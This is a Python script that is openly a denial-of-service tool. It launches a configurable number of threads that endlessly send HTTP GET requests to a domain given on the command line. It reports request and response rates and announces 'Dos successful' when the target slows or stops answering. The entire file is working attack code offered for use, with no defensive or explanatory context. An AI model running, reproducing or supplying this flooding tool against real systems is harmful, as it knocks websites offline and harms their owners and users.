import requests
import threading
import time
import sys
l = []
rl = []

def current_mil_time():
    return round(time.time() * 1000)

def current_sec_time():
    return round(time.time())

def count_resp_per_sec(time_took):
    t = current_sec_time()
    l.append({
        "time_took": time_took,
        "time_received": t,
    })
    for e in l[:]:  # safe removal
        if current_sec_time() - e["time_received"] >= 1:
            l.remove(e)

def count_req_per_sec():
    t = current_sec_time()
    rl.append({
        "time_received": t,
    })
    for e in rl[:]:  # safe removal
        if current_sec_time() - e["time_received"] >= 1:
            rl.remove(e)

message = "Dosing"

def make_request(thread_id):
    global message
    while True:
        count_req_per_sec()
        try:
            s = current_mil_time()
            r = requests.get(f'https://{sys.argv[1]}/')
            t = current_mil_time() - s
            print(f"Response code from thread {thread_id}: {r.status_code}")
            count_resp_per_sec(t)
        except:
            message = "Dos successful. site looks down for now."

if __name__ == "__main__":
    threads = int(sys.argv[2])
    while threads >= 1:
        x = threading.Thread(target=make_request, args=(threads,), daemon=True)
        print(f"Thread ID: {threads}")
        threads = threads - 1
        x.start()

    print("Calculating... wait for a while for it to adjust...")

    while True:
        time.sleep(1)
        response_time = 0
        for e in l:
            response_time += e['time_took']

        if len(l) > 0:
            response_time /= len(l)
        else:
            response_time = 0

        if response_time > 60000:
            message = "Dos successful. site looks down for now."
        else:
            message = "Dosing..."

        print(f"\rAverage response time: {round(response_time, 2)}ms; Requests/sec: {len(rl)}; Response/sec: {len(l)}; {message}", end="")
